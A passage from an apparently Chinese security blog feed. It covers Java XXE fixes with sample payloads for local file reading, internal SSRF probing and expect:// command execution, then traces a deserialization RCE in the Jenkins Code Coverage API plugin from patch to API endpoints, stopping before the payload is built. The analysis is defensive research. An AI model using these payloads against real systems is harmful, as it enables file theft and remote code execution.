class="keyword">try</span> &#123;</span><br><span class="line">            TransformerFactory tf = TransformerFactory.newInstance();</span><br><span class="line">            StreamSource source = <span class="keyword">new</span> StreamSource(req.getReader());</span><br><span class="line">            tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">            tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">""</span>);</span><br><span class="line">            tf.newTransformer().transform(source, <span class="keyword">new</span> StreamResult(resp.getWriter()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (TransformerException | IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>postNoFixXxe：</p><p><img src="/imgs/image-20210905211112297.png" alt="image-20210905211112297"></p><p>postWithFixXxe：</p><p><img src="/imgs/image-20210905212020646.png" alt="image-20210905212020646"></p><h4 id="Unmarshaller"><a href="#Unmarshaller" class="headerlink" title="Unmarshaller"></a>Unmarshaller</h4><p>使用默认的解析方法不会存在XXE问题，这也是唯一一个使用默认的解析方法不会存在XXE的一个库。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class tClass = Some<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">JAXBContext context = JAXBContext.newInstance(tClass);</span><br><span class="line">Unmarshaller um = context.createUnmarshaller();</span><br><span class="line">Object o = um.unmarshal(ResourceUtils.getPoc1());</span><br><span class="line">tClass.cast(o);</span><br></pre></td></tr></table></figure><h4 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h4><p>基本上所有的修复都是设置禁止外部实体，但是需要注意通过setFeature或者setAttribute或者setProperty设置属性时，一定要注意在解析xml之前就设置，否则修复也是无效的。</p><h3 id="0x04-危害"><a href="#0x04-危害" class="headerlink" title="0x04 危害"></a>0x04 危害</h3><p>xxe漏洞危害：</p><p>1、读取系统文件，信息泄露</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///E://111.txt"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2、Blind XXE 可以实施OoB数据外带攻击：<a href="https://www.cnblogs.com/3ichae1/p/13140229.html" target="_blank" rel="noopener">https://www.cnblogs.com/3ichae1/p/13140229.html</a></p><p>3、探测内网端口-SSRF</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">url</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.116.1:90/"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span><span class="symbol">&amp;url;</span><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4、执行系统命令</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">url</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"expect://id"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span><span class="symbol">&amp;url;</span><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>5、作为中间隧道，通过请求间接攻击内网网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY url SYSTEM &quot;带payload的url可getshell&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;xxe&gt;&amp;url;&lt;&#x2F;xxe&gt;</span><br></pre></td></tr></table></figure><p>6、拓展，不同语言支持的协议：</p><table><thead><tr><th>libxml2</th><th>PHP</th><th>Java</th><th>.NET</th></tr></thead><tbody><tr><td>file<br/>http<br/>ftp</td><td>file<br/>http<br/>ftp<br/>php<br/>compress.zlib<br/>compress.bzlip2<br/>data<br/>glob<br/>phar</td><td>file<br/>http<br/>https<br/>ftp<br/>jar<br/>netdoc<br/>mailto<br/>gopher</td><td>file<br/>http<br/>https<br/>ftp<br/></td></tr></tbody></table><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>Java XXE漏洞的修复或预防主要在设置禁止dtd，一般出现漏洞需要注意：</p><ol><li>是否禁止dtd或者entity</li><li>参数是否可控</li><li>传入参数格式为REST XML格式，X-RequestEntity-ContentType: application/xml</li></ol><h3 id="0x06-参考链接："><a href="#0x06-参考链接：" class="headerlink" title="0x06 参考链接："></a>0x06 参考链接：</h3><p><a href="https://blog.spoock.com/2018/10/23/java-xxe/" target="_blank" rel="noopener">https://blog.spoock.com/2018/10/23/java-xxe/</a><br><a href="https://www.leadroyal.cn/p/562/" target="_blank" rel="noopener">https://www.leadroyal.cn/p/562/</a><br><a href="https://www.cnblogs.com/r00tuser/p/7255939.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/7255939.html</a><br><a href="https://www.runoob.com/dtd/dtd-entities.html" target="_blank" rel="noopener">https://www.runoob.com/dtd/dtd-entities.html</a><br><a href="https://www.cnblogs.com/avivahe/p/5701392.html" target="_blank" rel="noopener">https://www.cnblogs.com/avivahe/p/5701392.html</a><br><a href="https://stackoverflow.com/questions/27985355/outputting-xml-on-java-servlet-using-printwriter" target="_blank" rel="noopener">https://stackoverflow.com/questions/27985355/outputting-xml-on-java-servlet-using-printwriter</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jenkins Code Coverage API 插件漏洞分析</title>
      <link href="2021/09/03/Jenkins-Code-Coverage-API-%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>2021/09/03/Jenkins-Code-Coverage-API-%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-漏洞描述信息"><a href="#0x01-漏洞描述信息" class="headerlink" title="0x01 漏洞描述信息"></a>0x01 漏洞描述信息</h3><p>逆推漏洞三方面：漏洞类型，漏洞入口api，构造payload。</p><p>该插件 1.4.0 及更早版本不对它从磁盘反序列化的 Java 对象应用<a href="https://github.com/jenkinsci/jep/tree/master/jep/200" target="_blank" rel="noopener">JEP-200 反序列化</a>保护。</p><p>这会导致能够控制代理进程的攻击者利用远程代码执行 (RCE) 漏洞。</p><p>Code Coverage API Plugin 1.4.1 将其 Java 对象反序列化配置为仅反序列化安全类型。</p><p>关键信息：反序列化RCE、磁盘、控制代理进程可利用该漏洞。</p><h3 id="0x02-补丁信息定位"><a href="#0x02-补丁信息定位" class="headerlink" title="0x02 补丁信息定位"></a>0x02 补丁信息定位</h3><p>补丁信息：<a href="https://github.com/jenkinsci/code-coverage-api-plugin/commit/a5b3c18cff2a0b494c55fa73b05fc935b50530be" target="_blank" rel="noopener">https://github.com/jenkinsci/code-coverage-api-plugin/commit/a5b3c18cff2a0b494c55fa73b05fc935b50530be</a></p><p>在<code>src/main/java/io/jenkins/plugins/coverage/CompatibleObjectInputStream.java</code>中添加了过滤，看类名InputStream是在反序列化过程中进行过滤了。</p><p><img src="/imgs/image-20210910090851273.png" alt="image-20210910090851273"></p><p>过滤名单<code>src/main/resources/META-INF/hudson.remoting.ClassFilter</code>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gnu.trove.impl.hash.THash</span><br><span class="line">gnu.trove.impl.hash.TIntHash</span><br><span class="line">gnu.trove.impl.hash.TPrimitiveHash</span><br><span class="line">gnu.trove.map.hash.TIntObjectHashMap</span><br></pre></td></tr></table></figure><p>另外加了测试代码，测试漏洞修复是否成功：</p><p><img src="/imgs/image-20210910111129924.png" alt="image-20210910111129924"></p><h3 id="0x03-Code-Coverage-API插件的使用："><a href="#0x03-Code-Coverage-API插件的使用：" class="headerlink" title="0x03 Code Coverage API插件的使用："></a>0x03 Code Coverage API插件的使用：</h3><p>在分析前先了解下怎么使用Code Coverage API插件。</p><p>参考官方给的使用说明：<a href="https://github.com/jenkinsci/code-coverage-api-plugin" target="_blank" rel="noopener">https://github.com/jenkinsci/code-coverage-api-plugin</a></p><p>创建项目时，新增构建后操作，选择发布代码覆盖率报告，配置覆盖率报告文件所在路径，最后保存。</p><p><img src="/imgs/image-20210910172103924.png" alt="image-20210910172103924"></p><p>保存好后，保证项目已经在<code>**/target/site/cobertura/coverage.xml</code>相关目录下生成了xml文件，可以开始构建，maven生成可参考<a href="https://blog.csdn.net/zlt995768025/article/details/79360203。" target="_blank" rel="noopener">https://blog.csdn.net/zlt995768025/article/details/79360203。</a></p><p>构建完成后可生成代码覆盖率报告。</p><p><img src="/imgs/image-20210910172456897.png" alt="image-20210910172456897"></p><h3 id="0x04-分析过程"><a href="#0x04-分析过程" class="headerlink" title="0x04 分析过程"></a>0x04 分析过程</h3><p>首先下载修复后的版本1.4.1，并在本地用idea加载进行分析。</p><h4 id="1、推测漏洞API"><a href="#1、推测漏洞API" class="headerlink" title="1、推测漏洞API"></a>1、推测漏洞API</h4><p>在测试程序中调用了<code>CoverageProcessor.recoverCoverageResult</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> FreeStyleProject fs = (FreeStyleProject) j.jenkins.getItemByFullName(<span class="string">"fs"</span>);</span><br><span class="line">CoverageProcessor.recoverCoverageResult(fs.getBuild(<span class="string">"1"</span>));</span><br></pre></td></tr></table></figure><p>定位到<code>CoverageProcessor.recoverCoverageResult</code>，主要作用是从coverage-report文件反序列化CoverageResult对象。而coverage-report文件是由<code>CoverageProcessor.saveCoverageResult</code>序列化对象建立的。那么构造payload一定就会调用<code>saveCoverageResult</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Recover &#123;<span class="doctag">@link</span> CoverageResult&#125; from build directory.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> run build</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Coverage result</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CoverageResult <span class="title">recoverCoverageResult</span><span class="params">(Run&lt;?, ?&gt; run)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// 新建一个名为coverage-report的文件</span></span><br><span class="line">    File reportFile = <span class="keyword">new</span> File(run.getRootDir(), DEFAULT_REPORT_SAVE_NAME);</span><br><span class="line">    <span class="comment">// 从文件coverage-report新建一个输入流，并调用readObject返回一个CoverageResult对象</span></span><br><span class="line">    <span class="keyword">try</span> (ObjectInputStream ois = <span class="keyword">new</span> CompatibleObjectInputStream(<span class="keyword">new</span> FileInputStream(reportFile))) &#123;</span><br><span class="line">        <span class="keyword">return</span> (CoverageResult) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">saveCoverageResult</span><span class="params">(Run&lt;?, ?&gt; run, CoverageResult report)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    File reportFile = <span class="keyword">new</span> File(run.getRootDir(), DEFAULT_REPORT_SAVE_NAME);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> (ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(reportFile))) &#123;</span><br><span class="line">        oos.writeObject(report);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在的问题是从哪里创建的coverage-report，我们控制什么数据可以生成想要的coverage-report？</p><p>saveCoverageResult仅被<code>CoverageProcessor.convertResultToAction</code>调用</p><p><img src="/imgs/image-20210913130515549.png" alt="image-20210913130515549"></p><p>convertResultToAction方法的作用是将报告CoverageResult转为action，并调用saveCoverageResult将CoverageResult实例保存到coverage-report文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将convertResult转为Action</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> CoverageAction <span class="title">convertResultToAction</span><span class="params">(CoverageResult coverageReport)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (CoverageProcessor<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        CoverageAction previousAction = run.getAction(CoverageAction<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">if</span> (previousAction == <span class="keyword">null</span>) &#123;</span><br><span class="line">            saveCoverageResult(run, coverageReport);</span><br><span class="line"></span><br><span class="line">            CoverageAction action = <span class="keyword">new</span> CoverageAction(coverageReport);</span><br><span class="line">            run.addAction(action);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> action;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            CoverageResult previousResult = previousAction.getResult();</span><br><span class="line">            Collection&lt;CoverageResult&gt; previousReports = previousResult.getChildrenReal().values();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (CoverageResult report : coverageReport.getChildrenReal().values()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (StringUtils.isEmpty(report.getTag())) &#123;</span><br><span class="line">                    report.resetParent(previousResult);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Optional&lt;CoverageResult&gt; matchedTagReport;</span><br><span class="line">                <span class="keyword">if</span> ((matchedTagReport = previousReports.stream()</span><br><span class="line">                     .filter(r -&gt; !StringUtils.isEmpty(r.getTag()) &amp;&amp; r.getTag().equals(report.getTag()))</span><br><span class="line">                     .findAny()).isPresent()) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        matchedTagReport.get().merge(report);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (CoverageException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                        report.resetParent(previousResult);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    report.resetParent(previousResult);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            previousResult.setOwner(run);</span><br><span class="line">            saveCoverageResult(run, previousResult);</span><br><span class="line">            <span class="keyword">return</span> previousAction;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而convertResultToAction会被<code>CoverageProcessor.performCoverageReport</code>调用。该方法会处理CoverageReportAdapter，将所有报告保存并聚合成一份报告，然后调用convertResultToAction将聚合的报告coverageReport转为action。CoverageReportAdapter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Convert all reports that are specified by &#123;<span class="doctag">@link</span> CoverageReportAdapter&#125;s and detected by &#123;<span class="doctag">@link</span> ReportDetector&#125;s to &#123;<span class="doctag">@link</span> CoverageResult&#125;,</span></span><br><span class="line"><span class="comment">     * and generate health report from CoverageResult. Add them to &#123;<span class="doctag">@link</span> CoverageAction&#125; and add Action to &#123;<span class="doctag">@link</span> Run&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> reportAdapters   reportAdapters specified by user</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> reportDetectors  reportDetectors specified by user</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> globalThresholds global threshold specified by user</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="comment">// 转换所有CoverageReportAdapter指定的报告或者被ReportDetector检测到的报告，生成CoverageResult</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">performCoverageReport</span><span class="params">(List&lt;CoverageReportAdapter&gt; reportAdapters, List&lt;ReportDetector&gt; reportDetectors, List&lt;Threshold&gt; globalThresholds)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, InterruptedException, CoverageException </span>&#123;</span><br><span class="line">    <span class="comment">// 调用convertToResults，调用convertToResults将用户指定路径下的所有覆盖率文件保存到对应的build文件夹，并将报告转成CoverageResult，结果到Map</span></span><br><span class="line">    Map&lt;CoverageReportAdapter, List&lt;CoverageResult&gt;&gt; results = convertToResults(reportAdapters, reportDetectors);</span><br><span class="line">    <span class="comment">//聚合报告</span></span><br><span class="line">    CoverageResult coverageReport = aggregateReports(results);</span><br><span class="line">    <span class="keyword">if</span> (coverageReport == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    coverageReport.setOwner(run);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sourceFileResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Set&lt;String&gt; possiblePaths = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        coverageReport.getChildrenReal().forEach((s, coverageResult) -&gt; &#123;</span><br><span class="line">            Set&lt;String&gt; paths = coverageResult.getAdditionalProperty(CoverageFeatureConstants.FEATURE_SOURCE_FILE_PATH);</span><br><span class="line">            <span class="keyword">if</span> (paths != <span class="keyword">null</span>) &#123;</span><br><span class="line">                possiblePaths.addAll(paths);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (possiblePaths.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sourceFileResolver.setPossiblePaths(possiblePaths);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        sourceFileResolver.resolveSourceFiles(run, workspace, listener, coverageReport.getPaintedSources());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (calculateDiffForChangeRequests) &#123;</span><br><span class="line">        setDiffInCoverageForChangeRequest(coverageReport);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用convertResultToAction将聚合的报告coverageReport转为action</span></span><br><span class="line">    CoverageAction action = convertResultToAction(coverageReport);</span><br><span class="line"></span><br><span class="line">    HealthReport healthReport = processThresholds(results, globalThresholds, action);</span><br><span class="line">    action.setHealthReport(healthReport);</span><br><span class="line">    <span class="keyword">if</span> (calculateDiffForChangeRequests &amp;&amp; failBuildIfCoverageDecreasedInChangeRequest) &#123;</span><br><span class="line">        failBuildIfChangeRequestDecreasedCoverage(coverageReport);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>io.jenkins.plugins.coverage.CoveragePublisher.performCoverageReport()</code>方法中调用了<code>CoverageProcessor.performCoverageReport()</code>。推测CoveragePublisher就是上面0x03中构建后操作添加的步骤-发布代码覆盖率报告的接口了。</p><p><img src="/imgs/image-20210913140332183.png" alt="image-20210913140332183"></p><p>到Web端观察了下上面的HTTP请求，其中<code>&quot;stapler-class\&quot;:+\&quot;io.jenkins.plugins.coverage.CoveragePublisher\&quot;,+\&quot;$class\&quot;:+\&quot;io.jenkins.plugins.coverage.CoveragePublisher\&quot;}</code>提到了接口CoveragePublisher，验证了刚刚的推测。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/me/my-views/view/all/job/github/configSubmit</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.116.1:8899</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.116.1:8899/me/my-views/view/all/job/github/configure</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 6553</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.116.1:8899</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">"description": "github+test",</span><br><span class="line">"stapler-class-bag": "true",</span><br><span class="line">"_.daysToKeepStr": "",</span><br><span class="line">......（省略部分）</span><br><span class="line">"_.path": "**/target/site/cobertura/coverage.xml",</span><br><span class="line">"_.level": "NEVER_STORE",</span><br><span class="line">"core:apply": "",</span><br><span class="line">"Jenkins-Crumb": "b52cd1411c8949575e838c2d90dad5a202562b8789f61f00ca7eadb82b07916c",</span><br><span class="line">"json": "&#123;\"description\":+\"github+test\",+\"properties\":+&#123;\"stapler-class-bag\":+\"true\",+\"jenkins-model-BuildDiscarderProperty\":+&#123;\"specified\":+false,+\"\":+\"0\",+\"strategy\":+&#123;\"daysToKeepStr\":+\"\",+\"numToKeepStr\":+\"\",+\"artifactDaysToKeepStr\":+\"\",+\"artifactNumToKeepStr\":+\"\",+\"stapler-class\":+\"hudson.tasks.LogRotator\",+\"$class\":+\"hudson.tasks.LogRotator\"&#125;&#125;,+\"com-coravy-hudson-plugins-github-GithubProjectProperty\":+&#123;\"githubProject\":+&#123;\"projectUrlStr\":+\"https://github.com/XXXXXX.git/\",+\"displayName\":+\"\"&#125;&#125;,+\"org-jenkins-plugins-lockableresources-RequiredResourcesProperty\":+&#123;&#125;,+\"hudson-model-ParametersDefinitionProperty\":+&#123;\"specified\":+false&#125;,+\"jenkins-branch-RateLimitBranchProperty$JobPropertyImpl\":+&#123;&#125;&#125;,+\"disable\":+false,+\"concurrentBuild\":+false,+\"hasCustomQuietPeriod\":+false,+\"quiet_period\":+\"5\",+\"hasCustomScmCheckoutRetryCount\":+false,+\"scmCheckoutRetryCount\":+\"0\",+\"blockBuildWhenUpstreamBuilding\":+false,+\"blockBuildWhenDownstreamBuilding\":+false,+\"hasCustomWorkspace\":+false,+\"customWorkspace\":+\"\",+\"displayNameOrNull\":+\"\",+\"scm\":+&#123;\"value\":+\"0\",+\"stapler-class\":+\"hudson.scm.NullSCM\",+\"$class\":+\"hudson.scm.NullSCM\"&#125;,+\"publisher\":+&#123;\"adapters\":+&#123;\"path\":+\"**/target/site/cobertura/coverage.xml\",+\"mergeToOneReport\":+false,+\"stapler-class\":+\"hudson.plugins.cobertura.adapter.CoberturaReportAdapter\",+\"$class\":+\"hudson.plugins.cobertura.adapter.CoberturaReportAdapter\"&#125;,+\"applyThresholdRecursively\":+false,+\"failUnhealthy\":+false,+\"failUnstable\":+false,+\"failNoReports\":+false,+\"calculateDiffForChangeRequests\":+false,+\"failBuildIfCoverageDecreasedInChangeRequest\":+false,+\"skipPublishingChecks\":+false,+\"sourceFileResolver\":+&#123;\"level\":+\"NEVER_STORE\"&#125;,+\"stapler-class\":+\"io.jenkins.plugins.coverage.CoveragePublisher\",+\"$class\":+\"io.jenkins.plugins.coverage.CoveragePublisher\"&#125;,+\"core:apply\":+\"\",+\"Jenkins-Crumb\":+\"b52cd1411c8949575e838c2d90dad5a202562b8789f61f00ca7eadb82b07916c\"&#125;",</span><br><span class="line">"Submit": "保存"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以请求API<code>.../view/all/job/jobname/configSubmit/</code>可以创建序列化文件coverage-report；而调用<code>CoverageProcessor.recoverCoverageResult</code>读取coverage-report进行反序列化，对应api定位到<code>CoverageAction.getResult()</code>，Web端测试后api是<code>/$stapler/bound/xxxxxxxxxxxxx/getResults</code>。</p><h4 id="2、构造coverage-report文件"><a href="#2、构造coverage-report文件" class="headerlink" 